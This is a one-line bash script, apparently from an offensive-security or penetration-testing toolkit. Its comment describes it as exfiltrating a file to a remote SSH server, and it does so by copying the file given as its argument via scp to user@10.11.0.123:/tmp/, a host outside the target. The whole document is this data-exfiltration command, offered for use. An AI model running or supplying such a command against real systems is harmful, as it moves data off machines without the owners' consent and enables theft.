#!/bin/bash
# Use SCP to exfil a file to a remote SSH server

scp "$1" user@10.11.0.123:/tmp/
